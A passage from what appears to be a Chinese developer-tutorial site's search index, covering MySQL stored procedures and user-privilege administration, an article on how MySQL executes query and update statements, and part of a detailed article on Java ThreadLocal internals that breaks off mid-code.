function_name; -- 查看  SHOW FUNCTION STATUS LIKE \u0026#39;partten\u0026#39; SHOW CREATE FUNCTION function_name; -- 修改  ALTER FUNCTION function_name 函数选项 --// 存储过程，自定义功能 ---------- -- 定义 存储存储过程 是一段代码（过程），存储在数据库中的sql组成。 一个存储过程通常用于完成一段业务逻辑，例如报名，交班费，订单入库等。 而一个函数通常专注与某个功能，视为其他程序服务的，需要在其他语句中调用函数才可以，而存储过程不能被其他调用，是自己执行 通过call执行。 -- 创建 CREATE PROCEDURE sp_name (参数列表) 过程体 参数列表：不同于函数的参数列表，需要指明参数类型 IN，表示输入型 OUT，表示输出型 INOUT，表示混合型 注意，没有返回值。 存储过程    /* 存储过程 */ ------------------ 存储过程是一段可执行性代码的集合。相比函数，更偏向于业务逻辑。 调用：CALL 过程名 -- 注意 - 没有返回值。 - 只能单独调用，不可夹杂在其他语句中 -- 参数 IN|OUT|INOUT 参数名 数据类型 IN 输入：在调用过程中，将数据输入到过程体内部的参数 OUT 输出：在调用过程中，将过程体处理完的结果返回到客户端 INOUT 输入输出：既可输入，也可输出 -- 语法 CREATE PROCEDURE 过程名 (参数列表) BEGIN 过程体 END 用户和权限管理    /* 用户和权限管理 */ ------------------ -- root密码重置 1. 停止MySQL服务 2. [Linux] /usr/local/mysql/bin/safe_mysqld --skip-grant-tables \u0026amp; [Windows] mysqld --skip-grant-tables 3. use mysql; 4. UPDATE `user` SET PASSWORD=PASSWORD(\u0026#34;密码\u0026#34;) WHERE `user` = \u0026#34;root\u0026#34;; 5. FLUSH PRIVILEGES; 用户信息表：mysql.user -- 刷新权限 FLUSH PRIVILEGES; -- 增加用户 CREATE USER 用户名 IDENTIFIED BY [PASSWORD] 密码(字符串) - 必须拥有mysql数据库的全局CREATE USER权限，或拥有INSERT权限。 - 只能创建用户，不能赋予权限。 - 用户名，注意引号：如 \u0026#39;user_name\u0026#39;@\u0026#39;192.168.1.1\u0026#39; - 密码也需引号，纯数字密码也要加引号 - 要在纯文本中指定密码，需忽略PASSWORD关键词。要把密码指定为由PASSWORD()函数返回的混编值，需包含关键字PASSWORD -- 重命名用户 RENAME USER old_user TO new_user -- 设置密码 SET PASSWORD = PASSWORD(\u0026#39;密码\u0026#39;) -- 为当前用户设置密码 SET PASSWORD FOR 用户名 = PASSWORD(\u0026#39;密码\u0026#39;) -- 为指定用户设置密码 -- 删除用户 DROP USER 用户名 -- 分配权限/添加用户 GRANT 权限列表 ON 表名 TO 用户名 [IDENTIFIED BY [PASSWORD] \u0026#39;password\u0026#39;] - all privileges 表示所有权限 - *.* 表示所有库的所有表 - 库名.表名 表示某库下面的某表 GRANT ALL PRIVILEGES ON `pms`.* TO \u0026#39;pms\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;pms0817\u0026#39;; -- 查看权限 SHOW GRANTS FOR 用户名 -- 查看当前用户权限  SHOW GRANTS; 或 SHOW GRANTS FOR CURRENT_USER; 或 SHOW GRANTS FOR CURRENT_USER(); -- 撤消权限 REVOKE 权限列表 ON 表名 FROM 用户名 REVOKE ALL PRIVILEGES, GRANT OPTION FROM 用户名 -- 撤销所有权限 -- 权限层级 -- 要使用GRANT或REVOKE，您必须拥有GRANT OPTION权限，并且您必须用于您正在授予或撤销的权限。 全局层级：全局权限适用于一个给定服务器中的所有数据库，mysql.user GRANT ALL ON *.*和 REVOKE ALL ON *.*只授予和撤销全局权限。 数据库层级：数据库权限适用于一个给定数据库中的所有目标，mysql.db, mysql.host GRANT ALL ON db_name.*和REVOKE ALL ON db_name.*只授予和撤销数据库权限。 表层级：表权限适用于一个给定表中的所有列，mysql.talbes_priv GRANT ALL ON db_name.tbl_name和REVOKE ALL ON db_name.tbl_name只授予和撤销表权限。 列层级：列权限适用于一个给定表中的单一列，mysql.columns_priv 当使用REVOKE时，您必须指定与被授权列相同的列。 -- 权限列表 ALL [PRIVILEGES] -- 设置除GRANT OPTION之外的所有简单权限 ALTER -- 允许使用ALTER TABLE ALTER ROUTINE -- 更改或取消已存储的子程序 CREATE -- 允许使用CREATE TABLE CREATE ROUTINE -- 创建已存储的子程序 CREATE TEMPORARY TABLES -- 允许使用CREATE TEMPORARY TABLE CREATE USER -- 允许使用CREATE USER, DROP USER, RENAME USER和REVOKE ALL PRIVILEGES。 CREATE VIEW -- 允许使用CREATE VIEW DELETE -- 允许使用DELETE DROP -- 允许使用DROP TABLE EXECUTE -- 允许用户运行已存储的子程序 FILE -- 允许使用SELECT...INTO OUTFILE和LOAD DATA INFILE INDEX -- 允许使用CREATE INDEX和DROP INDEX INSERT -- 允许使用INSERT LOCK TABLES -- 允许对您拥有SELECT权限的表使用LOCK TABLES PROCESS -- 允许使用SHOW FULL PROCESSLIST REFERENCES -- 未被实施 RELOAD -- 允许使用FLUSH REPLICATION CLIENT -- 允许用户询问从属服务器或主服务器的地址 REPLICATION SLAVE -- 用于复制型从属服务器（从主服务器中读取二进制日志事件） SELECT -- 允许使用SELECT SHOW DATABASES -- 显示所有数据库 SHOW VIEW -- 允许使用SHOW CREATE VIEW SHUTDOWN -- 允许使用mysqladmin shutdown SUPER -- 允许使用CHANGE MASTER, KILL, PURGE MASTER LOGS和SET GLOBAL语句，mysqladmin debug命令；允许您连接（一次），即使已达到max_connections。 UPDATE -- 允许使用UPDATE USAGE -- “无权限”的同义词 GRANT OPTION -- 允许授予权限 表维护    /* 表维护 */ -- 分析和存储表的关键字分布 ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE 表名 ... -- 检查一个或多个表是否有错误 CHECK TABLE tbl_name [, tbl_name] ... [option] ... option = {QUICK | FAST | MEDIUM | EXTENDED | CHANGED} -- 整理数据文件的碎片 OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ... 杂项    /* 杂项 */ ------------------ 1. 可用反引号（`）为标识符（库名、表名、字段名、索引、别名）包裹，以避免与关键字重名！中文也可以作为标识符！ 2. 每个库目录存在一个保存当前数据库的选项文件db.opt。 3. 注释： 单行注释 # 注释内容  多行注释 /* 注释内容 */ 单行注释 -- 注释内容 (标准SQL注释风格，要求双破折号后加一空格符（空格、TAB、换行等）) 4. 模式通配符： _ 任意单个字符 % 任意多个字符，甚至包括零字符 单引号需要进行转义 \\\u0026#39; 5. CMD命令行内的语句结束符可以为 \u0026#34;;\u0026#34;, \u0026#34;\\G\u0026#34;, \u0026#34;\\g\u0026#34;，仅影响显示结果。其他地方还是用分号结束。delimiter 可修改当前对话的语句结束符。 6. SQL对大小写不敏感 7. 清除已有语句：\\c "},{"id":321,"href":"/database/mysql/%E4%B8%80%E6%9D%A1sql%E8%AF%AD%E5%8F%A5%E5%9C%A8mysql%E4%B8%AD%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E7%9A%84/","title":"一条sql语句在mysql中如何执行的","parent":"mysql","content":"本文来自木木匠投稿。\n 一 MySQL 基础架构分析  1.1 MySQL 基本架构概览 1.2 Server 层基本组件介绍  1) 连接器 2) 查询缓存(MySQL 8.0 版本后移除) 3) 分析器 4) 优化器 5) 执行器     二 语句分析  2.1 查询语句 2.2 更新语句   三 总结 四 参考  本篇文章会分析下一个 sql 语句在 MySQL 中的执行流程，包括 sql 的查询在 MySQL 内部会怎么流转，sql 语句的更新是怎么完成的。\n在分析之前我会先带着你看看 MySQL 的基础架构，知道了 MySQL 由那些组件组成以及这些组件的作用是什么，可以帮助我们理解和解决这些问题。\n一 MySQL 基础架构分析    1.1 MySQL 基本架构概览    下图是 MySQL 的一个简要架构图，从下图你可以很清晰的看到用户的 SQL 语句在 MySQL 内部是如何执行的。\n先简单介绍一下下图涉及的一些组件的基本作用帮助大家理解这幅图，在 1.2 节中会详细介绍到这些组件的作用。\n **连接器：**身份认证和权限相关(登录 MySQL 的时候)。 **查询缓存：**执行查询语句的时候，会先查询缓存（MySQL 8.0 版本后移除，因为这个功能不太实用）。 分析器： 没有命中缓存的话，SQL 语句就会经过分析器，分析器说白了就是要先看你的 SQL 语句要干嘛，再检查你的 SQL 语句语法是否正确。 **优化器：**按照 MySQL 认为最优的方案去执行。 **执行器：**执行语句，然后从存储引擎返回数据。  简单来说 MySQL 主要分为 Server 层和存储引擎层：\n Server 层：主要包括连接器、查询缓存、分析器、优化器、执行器等，所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图，函数等，还有一个通用的日志模块 binglog 日志模块。 存储引擎： 主要负责数据的存储和读取，采用可以替换的插件式架构，支持 InnoDB、MyISAM、Memory 等多个存储引擎，其中 InnoDB 引擎有自有的日志模块 redolog 模块。现在最常用的存储引擎是 InnoDB，它从 MySQL 5.5.5 版本开始就被当做默认存储引擎了。  1.2 Server 层基本组件介绍    1) 连接器    连接器主要和身份认证和权限相关的功能相关，就好比一个级别很高的门卫一样。\n主要负责用户登录数据库，进行用户的身份认证，包括校验账户密码，权限等操作，如果用户账户密码已通过，连接器会到权限表中查询该用户的所有权限，之后在这个连接里的权限逻辑判断都是会依赖此时读取到的权限数据，也就是说，后续只要这个连接不断开，即时管理员修改了该用户的权限，该用户也是不受影响的。\n2) 查询缓存(MySQL 8.0 版本后移除)    查询缓存主要用来缓存我们所执行的 SELECT 语句以及该语句的结果集。\n连接建立后，执行查询语句的时候，会先查询缓存，MySQL 会先校验这个 sql 是否执行过，以 Key-Value 的形式缓存在内存中，Key 是查询预计，Value 是结果集。如果缓存 key 被命中，就会直接返回给客户端，如果没有命中，就会执行后续的操作，完成后也会把结果缓存起来，方便下一次调用。当然在真正执行缓存查询的时候还是会校验用户的权限，是否有该表的查询条件。\nMySQL 查询不建议使用缓存，因为查询缓存失效在实际业务场景中可能会非常频繁，假如你对一个表更新的话，这个表上的所有的查询缓存都会被清空。对于不经常更新的数据来说，使用缓存还是可以的。\n所以，一般在大多数情况下我们都是不推荐去使用查询缓存的。\nMySQL 8.0 版本后删除了缓存的功能，官方也是认为该功能在实际的应用场景比较少，所以干脆直接删掉了。\n3) 分析器    MySQL 没有命中缓存，那么就会进入分析器，分析器主要是用来分析 SQL 语句是来干嘛的，分析器也会分为几步：\n第一步，词法分析，一条 SQL 语句有多个字符串组成，首先要提取关键字，比如 select，提出查询的表，提出字段名，提出查询条件等等。做完这些操作后，就会进入第二步。\n第二步，语法分析，主要就是判断你输入的 sql 是否正确，是否符合 MySQL 的语法。\n完成这 2 步之后，MySQL 就准备开始执行了，但是如何执行，怎么执行是最好的结果呢？这个时候就需要优化器上场了。\n4) 优化器    优化器的作用就是它认为的最优的执行方案去执行（有时候可能也不是最优，这篇文章涉及对这部分知识的深入讲解），比如多个索引的时候该如何选择索引，多表查询的时候如何选择关联顺序等。\n可以说，经过了优化器之后可以说这个语句具体该如何执行就已经定下来。\n5) 执行器    当选择了执行方案后，MySQL 就准备开始执行了，首先执行前会校验该用户有没有权限，如果没有权限，就会返回错误信息，如果有权限，就会去调用引擎的接口，返回接口执行的结果。\n二 语句分析    2.1 查询语句    说了以上这么多，那么究竟一条 sql 语句是如何执行的呢？其实我们的 sql 可以分为两种，一种是查询，一种是更新（增加，更新，删除）。我们先分析下查询语句，语句如下：\nselect * from tb_student A where A.age=\u0026#39;18\u0026#39; and A.name=\u0026#39; 张三 \u0026#39;; 结合上面的说明，我们分析下这个语句的执行流程：\n  先检查该语句是否有权限，如果没有权限，直接返回错误信息，如果有权限，在 MySQL8.0 版本以前，会先查询缓存，以这条 sql 语句为 key 在内存中查询是否有结果，如果有直接缓存，如果没有，执行下一步。\n  通过分析器进行词法分析，提取 sql 语句的关键元素，比如提取上面这个语句是查询 select，提取需要查询的表名为 tb_student，需要查询所有的列，查询条件是这个表的 id=\u0026lsquo;1\u0026rsquo;。然后判断这个 sql 语句是否有语法错误，比如关键词是否正确等等，如果检查没问题就执行下一步。\n  接下来就是优化器进行确定执行方案，上面的 sql 语句，可以有两种执行方案：\n a.先查询学生表中姓名为“张三”的学生，然后判断是否年龄是 18。 b.先找出学生中年龄 18 岁的学生，然后再查询姓名为“张三”的学生。  那么优化器根据自己的优化算法进行选择执行效率最好的一个方案（优化器认为，有时候不一定最好）。那么确认了执行计划后就准备开始执行了。\n  进行权限校验，如果没有权限就会返回错误信息，如果有权限就会调用数据库引擎接口，返回引擎的执行结果。\n  2.2 更新语句    以上就是一条查询 sql 的执行流程，那么接下来我们看看一条更新语句如何执行的呢？sql 语句如下：\nupdate tb_student A set A.age='19' where A.name=' 张三 '; 我们来给张三修改下年龄，在实际数据库肯定不会设置年龄这个字段的，不然要被技术负责人打的。其实这条语句也基本上会沿着上一个查询的流程走，只不过执行更新的时候肯定要记录日志啦，这就会引入日志模块了，MySQL 自带的日志模块是 binlog（归档日志） ，所有的存储引擎都可以使用，我们常用的 InnoDB 引擎还自带了一个日志模块 redo log（重做日志），我们就以 InnoDB 模式下来探讨这个语句的执行流程。流程如下：\n 先查询到张三这一条数据，如果有缓存，也是会用到缓存。 然后拿到查询的语句，把 age 改为 19，然后调用引擎 API 接口，写入这一行数据，InnoDB 引擎把数据保存在内存中，同时记录 redo log，此时 redo log 进入 prepare 状态，然后告诉执行器，执行完成了，随时可以提交。 执行器收到通知后记录 binlog，然后调用引擎接口，提交 redo log 为提交状态。 更新完成。  这里肯定有同学会问，为什么要用两个日志模块，用一个日志模块不行吗?\n这是因为最开始 MySQL 并没有 InnoDB 引擎（InnoDB 引擎是其他公司以插件形式插入 MySQL 的），MySQL 自带的引擎是 MyISAM，但是我们知道 redo log 是 InnoDB 引擎特有的，其他存储引擎都没有，这就导致会没有 crash-safe 的能力(crash-safe 的能力即使数据库发生异常重启，之前提交的记录都不会丢失)，binlog 日志只能用来归档。\n并不是说只用一个日志模块不可以，只是 InnoDB 引擎就是通过 redo log 来支持事务的。那么，又会有同学问，我用两个日志模块，但是不要这么复杂行不行，为什么 redo log 要引入 prepare 预提交状态？这里我们用反证法来说明下为什么要这么做？\n 先写 redo log 直接提交，然后写 binlog，假设写完 redo log 后，机器挂了，binlog 日志没有被写入，那么机器重启后，这台机器会通过 redo log 恢复数据，但是这个时候 bingog 并没有记录该数据，后续进行机器备份的时候，就会丢失这一条数据，同时主从同步也会丢失这一条数据。 先写 binlog，然后写 redo log，假设写完了 binlog，机器异常重启了，由于没有 redo log，本机是无法恢复这一条记录的，但是 binlog 又有记录，那么和上面同样的道理，就会产生数据不一致的情况。  如果采用 redo log 两阶段提交的方式就不一样了，写完 binglog 后，然后再提交 redo log 就会防止出现上述的问题，从而保证了数据的一致性。那么问题来了，有没有一个极端的情况呢？假设 redo log 处于预提交状态，binglog 也已经写完了，这个时候发生了异常重启会怎么样呢？ 这个就要依赖于 MySQL 的处理机制了，MySQL 的处理过程如下：\n 判断 redo log 是否完整，如果判断是完整的，就立即提交。 如果 redo log 只是预提交但不是 commit 状态，这个时候就会去判断 binlog 是否完整，如果完整就提交 redo log, 不完整就回滚事务。  这样就解决了数据一致性的问题。\n三 总结     MySQL 主要分为 Server 层和引擎层，Server 层主要包括连接器、查询缓存、分析器、优化器、执行器，同时还有一个日志模块（binlog），这个日志模块所有执行引擎都可以共用，redolog 只有 InnoDB 有。 引擎层是插件式的，目前主要包括，MyISAM,InnoDB,Memory 等。 查询语句的执行流程如下：权限校验（如果命中缓存）\u0026mdash;\u0026gt;查询缓存\u0026mdash;\u0026gt;分析器\u0026mdash;\u0026gt;优化器\u0026mdash;\u0026gt;权限校验\u0026mdash;\u0026gt;执行器\u0026mdash;\u0026gt;引擎 更新语句执行流程如下：分析器\u0026mdash;-\u0026gt;权限校验\u0026mdash;-\u0026gt;执行器\u0026mdash;\u0026gt;引擎\u0026mdash;redo log(prepare 状态)\u0026mdash;\u0026gt;binlog\u0026mdash;\u0026gt;redo log(commit状态)  四 参考     《MySQL 实战45讲》 MySQL 5.6参考手册:https://dev.MySQL.com/doc/refman/5.6/en/  "},{"id":322,"href":"/java/multi-thread/%E4%B8%87%E5%AD%97%E8%AF%A6%E8%A7%A3ThreadLocal%E5%85%B3%E9%94%AE%E5%AD%97/","title":"万字详解ThreadLocal关键字","parent":"multi-thread","content":" 本文来自一枝花算不算浪漫投稿， 原文地址：https://juejin.im/post/5eacc1c75188256d976df748。\n 前言    全文共 10000+字，31 张图，这篇文章同样耗费了不少的时间和精力才创作完成，原创不易，请大家点点关注+在看，感谢。\n对于ThreadLocal，大家的第一反应可能是很简单呀，线程的变量副本，每个线程隔离。那这里有几个问题大家可以思考一下：\n ThreadLocal的 key 是弱引用，那么在 ThreadLocal.get()的时候，发生GC之后，key 是否为null？ ThreadLocal中ThreadLocalMap的数据结构？ ThreadLocalMap的Hash 算法？ ThreadLocalMap中Hash 冲突如何解决？ ThreadLocalMap的扩容机制？ ThreadLocalMap中过期 key 的清理机制？探测式清理和启发式清理流程？ ThreadLocalMap.set()方法实现原理？ ThreadLocalMap.get()方法实现原理？ 项目中ThreadLocal使用情况？遇到的坑？ \u0026hellip;\u0026hellip;  上述的一些问题你是否都已经掌握的很清楚了呢？本文将围绕这些问题使用图文方式来剖析ThreadLocal的点点滴滴。\n目录    注明： 本文源码基于JDK 1.8\nThreadLocal代码演示    我们先看下ThreadLocal使用示例：\npublic class ThreadLocalTest { private List\u0026lt;String\u0026gt; messages = Lists.newArrayList(); public static final ThreadLocal\u0026lt;ThreadLocalTest\u0026gt; holder = ThreadLocal.withInitial(ThreadLocalTest::new); public static void add(String message) { holder.get().messages.add(message); } public static List\u0026lt;String\u0026gt; clear() { List\u0026lt;String\u0026gt; messages = holder.get().messages; holder.remove(); System.out.println(\u0026#34;size: \u0026#34; + holder.get().messages.size()); return messages; } public static void main(String[] args) { ThreadLocalTest.add(\u0026#34;一枝花算不算浪漫\u0026#34;); System.out.println(holder.get().messages); ThreadLocalTest.clear(); } } 打印结果：\n[一枝花算不算浪漫] size: 0 ThreadLocal对象可以提供线程局部变量，每个线程Thread拥有一份自己的副本变量，多个线程互不干扰。\nThreadLocal的数据结构    Thread类有一个类型为ThreadLocal.ThreadLocalMap的实例变量threadLocals，也就是说每个线程有一个自己的ThreadLocalMap。\nThreadLocalMap有自己的独立实现，可以简单地将它的key视作ThreadLocal，value为代码中放入的值（实际上key并不是ThreadLocal本身，而是它的一个弱引用）。\n每个线程在往ThreadLocal里放值的时候，都会往自己的ThreadLocalMap里存，读也是以ThreadLocal作为引用，在自己的map里找对应的key，从而实现了线程隔离。\nThreadLocalMap有点类似HashMap的结构，只是HashMap是由数组+链表实现的，而ThreadLocalMap中并没有链表结构。\n我们还要注意Entry， 它的key是ThreadLocal\u0026lt;?\u0026gt; k ，继承自WeakReference， 也就是我们常说的弱引用类型。\nGC 之后 key 是否为 null？    回应开头的那个问题， ThreadLocal 的key是弱引用，那么在ThreadLocal.get()的时候，发生GC之后，key是否是null？\n为了搞清楚这个问题，我们需要搞清楚Java的四种引用类型：\n 强引用：我们常常 new 出来的对象就是强引用类型，只要强引用存在，垃圾回收器将永远不会回收被引用的对象，哪怕内存不足的时候 软引用：使用 SoftReference 修饰的对象被称为软引用，软引用指向的对象在内存要溢出的时候被回收 弱引用：使用 WeakReference 修饰的对象被称为弱引用，只要发生垃圾回收，若这个对象只被弱引用指向，那么就会被回收 虚引用：虚引用是最弱的引用，在 Java 中使用 PhantomReference 进行定义。虚引用中唯一的作用就是用队列接收对象即将死亡的通知  接着再来看下代码，我们使用反射的方式来看看GC后ThreadLocal中的数据情况：(下面代码来源自：https://blog.csdn.net/thewindkee/article/details/103726942 本地运行演示 GC 回收场景)\npublic class ThreadLocalDemo { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, InterruptedException { Thread t = new Thread(()-\u0026gt;test(\u0026#34;abc\u0026#34;,false)); t.start(); t.join(); System.out.println(\u0026#34;--gc后--\u0026#34;); Thread t2 = new Thread(() -\u0026gt; test(\u0026#34;def\u0026#34;, true)); t2.start(); t2.join(); } private static void test(String s,boolean isGC) { try { new ThreadLocal\u0026lt;\u0026gt;().set(s); if (isGC) { System.gc(); } Thread t = Thread.currentThread(); Class\u0026lt;? extends Thread\u0026gt; clz = t.getClass(); Field field = clz.getDeclaredField(\u0026#34;threadLocals\u0026#34;); field.setAccessible(true); Object ThreadLocalMap = field.get(t); Class\u0026lt;?\u0026gt; tlmClass = ThreadLocalMap.getClass(); Field tableField = tlmClass.getDeclaredField(\u0026#34;table\u0026#34;); tableField.setAccessible(true); Object[] arr = (Object[]) tableField.get(ThreadLocalMap); for (Object o : arr) { if (o != null) { Class\u0026lt;?\u0026gt; entryClass = o.getClass(); Field valueField = entryClass.getDeclaredField(\u0026#34;value\u0026#34;); Field referenceField = entryClass.getSuperclass().getSuperclass().getDeclaredField(\u0026#34;referent\u0026#34;); valueField.setAccessible(true); referenceField.setAccessible(true); System.out.println(String.format(\u0026#34;弱引用key:%s,值:%s\u0026#34;, referenceField.get(o), valueField.get(o))); } } } catch (Exception e) { e.printStackTrace(); } } } 结果如下：\n弱引用key:java.lang.ThreadLocal@433619b6,值:abc 弱引用key:java.lang.ThreadLocal@418a15e3,值:java.lang.ref.SoftReference@bf97a12 --gc后-- 弱引用key:null,值:def 如图所示，因为这里创建的ThreadLocal并没有指向任何值，也就是没有任何引用：\nnew ThreadLocal\u0026lt;\u0026gt;().set(s); 所以这里在GC之后，key就会被回收，我们看到上面debug中的referent=null, 如果改动一下代码：\n这个问题刚开始看，如果没有过多思考，弱引用，还有垃圾回收，那么肯定会觉得是null。\n其实是不对的，因为题目说的是在做 ThreadLocal.get() 操作，证明其实还是有强引用存在的，所以 key 并不为 null，如下图所示，ThreadLocal的强引用仍然是存在的。\n如果我们的强引用不存在的话，那么 key 就会被回收，也就是会出现我们 value 没被回收，key 被回收，导致 value 永远存在，出现内存泄漏。\nThreadLocal.set()方法源码详解    ThreadLocal中的set方法原理如上图所示，很简单，主要是判断ThreadLocalMap是否存在，然后使用ThreadLocal中的set方法进行数据处理。\n代码如下：\npublic void set(T value) { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value); } void createMap(Thread t, T firstValue) { t.threadLocals = new ThreadLocalMap(this, firstValue); } 主要的核心逻辑还是在ThreadLocalMap中的，一步步往下看，后面还有更详细的剖析。\nThreadLocalMap Hash 算法    既然是Map结构，那么ThreadLocalMap当然也要实现自己的hash算法来解决散列表数组冲突问题。\nint i = key.threadLocalHashCode \u0026amp; (len-1); ThreadLocalMap中hash算法很简单，这里i就是当前 key 在散列表中对应的数组下标位置。\n这里最关键的就是threadLocalHashCode值的计算，ThreadLocal中有一个属性为HASH_INCREMENT = 0x61c88647\npublic class ThreadLocal\u0026lt;T\u0026gt; { private final int threadLocalHashCode = nextHashCode(); private static AtomicInteger nextHashCode = new AtomicInteger(); private static final int HASH_INCREMENT = 0x61c88647; private static int nextHashCode() { return nextHashCode.getAndAdd(HASH_INCREMENT); } static class ThreadLocalMap { ThreadLocalMap(ThreadLocal\u0026lt;?\u0026gt; firstKey, Object firstValue) { table = new Entry[INITIAL_CAPACITY]; int i = firstKey.threadLocalHashCode \u0026amp; (INITIAL_CAPACITY - 1); table[i] = new Entry(firstKey, firstValue); size = 1; setThreshold(INITIAL_CAPACITY); } } } 每当创建一个ThreadLocal对象，这个ThreadLocal.nextHashCode 这个值就会增长 0x61c88647 。\n这个值很特殊，它是斐波那契数 也叫 黄金分割数。hash增量为 这个数字，带来的好处就是 hash 分布非常均匀。\n我们自己可以尝试下：\n可以看到产生的哈希码分布很均匀，这里不去细纠斐波那契具体算法，感兴趣的可以自行查阅相关资料。\nThreadLocalMap Hash 冲突     注明： 下面所有示例图中，绿色块Entry代表正常数据，灰色块代表Entry的key值为null，已被垃圾回收。白色块表示Entry为null。\n 虽然ThreadLocalMap中使用了黄金分割数来作为hash计算因子，大大减少了Hash冲突的概率，但是仍然会存在冲突。\nHashMap中解决冲突的方法是在数组上构造一个链表结构，冲突的数据挂载到链表上，如果链表长度超过一定数量则会转化成红黑树。\n而 ThreadLocalMap 中并没有链表结构，所以这里不能使用 HashMap 解决冲突的方式了。\n如上图所示，如果我们插入一个value=27的数据，通过 hash 计算后应该落入槽位 4 中，而槽位 4 已经有了 Entry 数据。\n此时就会线性向后查找，一直找到 Entry 为 null 的槽位才会停止查找，将当前元素放入此槽位中。当然迭代过程中还有其他的情况，比如遇到了 Entry 不为 null 且 key 值相等的情况，还有 Entry 中的 key 值为 null 的情况等等都会有不同的处理，后面会一一详细讲解。\n这里还画了一个Entry中的key为null的数据（Entry=2 的灰色块数据），因为key值是弱引用类型，所以会有这种数据存在。在set过程中，如果遇到了key过期的Entry数据，实际上是会进行一轮探测式清理操作的，具体操作方式后面会讲到。\nThreadLocalMap.set()详解    ThreadLocalMap.set()原理图解    看完了ThreadLocal hash 算法后，我们再来看set是如何实现的。\n往ThreadLocalMap中set数据（新增或者更新数据）分为好几种情况，针对不同的情况我们画图来说明。\n第一种情况： 通过hash计算后的槽位对应的Entry数据为空：\n这里直接将数据放到该槽位即可。\n第二种情况： 槽位数据不为空，key值与当前ThreadLocal通过hash计算获取的key值一致：\n这里直接更新该槽位的数据。\n第三种情况： 槽位数据不为空，往后遍历过程中，在找到Entry为null的槽位之前，没有遇到key过期的Entry：\n遍历散列数组，线性往后查找，如果找到Entry为null的槽位，则将数据放入该槽位中，或者往后遍历过程中，遇到了key 值相等的数据，直接更新即可。\n第四种情况： 槽位数据不为空，往后遍历过程中，在找到Entry为null的槽位之前，遇到key过期的Entry，如下图，往后遍历过程中，遇到了index=7的槽位数据Entry的key=null：\n散列数组下标为 7 位置对应的Entry数据key为null，表明此数据key值已经被垃圾回收掉了，此时就会执行replaceStaleEntry()方法，该方法含义是替换过期数据的逻辑，以index=7位起点开始遍历，进行探测式数据清理工作。\n初始化探测式清理过期数据扫描的开始位置：slotToExpunge = staleSlot = 7\n以当前staleSlot开始 向前迭代查找，找其他过期的数据，然后更新过期数据起始扫描下标slotToExpunge。for循环迭代，直到碰到Entry为null结束。\n如果找到了过期的数据，继续向前迭代，直到遇到Entry=null的槽位才停止迭代，如下图所示，slotToExpunge 被更新为 0：\n以当前节点(index=7)向前迭代，检测是否有过期的Entry数据，如果有则更新slotToExpunge值。碰到null则结束探测。以上图为例slotToExpunge被更新为 0。\n上面向前迭代的操作是为了更新探测清理过期数据的起始下标slotToExpunge的值，这个值在后面会讲解，它是用来判断当前过期槽位staleSlot之前是否还有过期元素。\n接着开始以staleSlot位置(index=7)向后迭代，如果找到了相同 key 值的 Entry 数据：\n从当前节点staleSlot向后查找key值相等的Entry元素，找到后更新Entry的值并交换staleSlot元素的位置(staleSlot位置为过期元素)，更新Entry数据，然后开始进行过期Entry的清理工作，如下图所示：\n向后遍历过程中，如果没有找到相同 key 值的 Entry 数据：\n从当前节点staleSlot向后查找key值相等的Entry元素，直到Entry为null则停止寻找。通过上图可知，此时table中没有key值相同的Entry。\n创建新的Entry，替换table[stableSlot]位置：\n替换完成后也是进行过期元素清理工作，清理工作主要是有两个方法：expungeStaleEntry()和cleanSomeSlots()，具体细节后面会讲到，请继续往后看。\nThreadLocalMap.set()源码详解    上面已经用图的方式解析了set()实现的原理，其实已经很清晰了，我们接着再看下源码：\njava.lang.ThreadLocal.ThreadLocalMap.set():\nprivate void set(ThreadLocal\u0026lt;?\u0026gt; key, Object value) { Entry[] tab = table; int len = tab.length; int i = key.threadLocalHashCode \u0026amp; (len-1); for (Entry e = tab[i]; e != null; e = tab[i = nextIndex(i, len)]) { ThreadLocal\u0026lt;?\u0026gt; k = e.get(); if (k == key) { e.value = value; return; } if (k == null) { replaceStaleEntry(key, value, i); return; } } tab[i] = new Entry(key, value); int sz = ++size; if (!cleanSomeSlots(i, sz) \u0026amp;\u0026amp; sz \u0026gt;= threshold) rehash(); } 这里会通过key来计算在散列表中的对应位置，然后以当前key对应的桶的位置向后查找，找到可以使用的桶。\nEntry[] tab = table; int len = tab.length; int i = key.threadLocalHashCode \u0026amp; (len-1); 什么情况下桶才是可以使用的呢？\n k = key 说明是替换操作，可以使用 碰到一个过期的桶，执行替换逻辑，占用过期桶 查找过程中，碰到桶中Entry=null的情况，直接使用  接着就是执行for循环遍历，向后查找，我们先看下nextIndex()、prevIndex()方法实现：\nprivate static int nextIndex(int i, int len) { return ((i + 1 \u0026lt; len) ? i + 1 : 0); } private static int prevIndex(int i, int len) { return ((i - 1 \u0026gt;= 0) ? i - 1 : len - 1); } 接着看剩下for循环中的逻辑：\n 遍历当前key值对应的桶中Entry数据为空，这说明散列数组这里没有数据冲突，跳出for循环，直接set数据到对应的桶中 如果key值对应的桶中Entry数据不为空\n2.1 如果k = key，说明当前set操作是一个替换操作，做替换逻辑，直接返回\n2.2 如果key = null，说明当前桶位置的Entry是过期数据，执行replaceStaleEntry()方法(核心方法)，然后返回 for循环执行完毕，继续往下执行说明向后迭代的过程中遇到了entry为null的情况\n3.1 在Entry为null的桶中创建一个新的Entry对象\n3.2 执行++size操作 调用cleanSomeSlots()做一次启发式清理工作，清理散列数组中Entry的key过期的数据\n4.1 如果清理工作完成后，未清理到任何数据，且size超过了阈值(数组长度的 2/3)，进行rehash()操作\n4.2 rehash()中会先进行一轮探测式清理，清理过期key，清理完成后如果size \u0026gt;= threshold - threshold / 4，就会执行真正的扩容逻辑(扩容逻辑往后看)  接着重点看下replaceStaleEntry()方法，replaceStaleEntry()方法提供替换过期数据的功能，我们可以对应上面第四种情况的原理图来再回顾下，具体代码如下：\njava.lang.ThreadLocal.ThreadLocalMap.replaceStaleEntry():\nprivate void replaceStaleEntry(ThreadLocal\u0026lt;?\u0026gt; key, Object value, int staleSlot) { Entry[] tab = table; int len = tab.length; Entry e; int slotToExpunge = staleSlot; for (int i = prevIndex(staleSlot, len); (e = tab[i]) != null; i = prevIndex(i, len)) if (e.get() == null) slotToExpunge = i; for (int i = 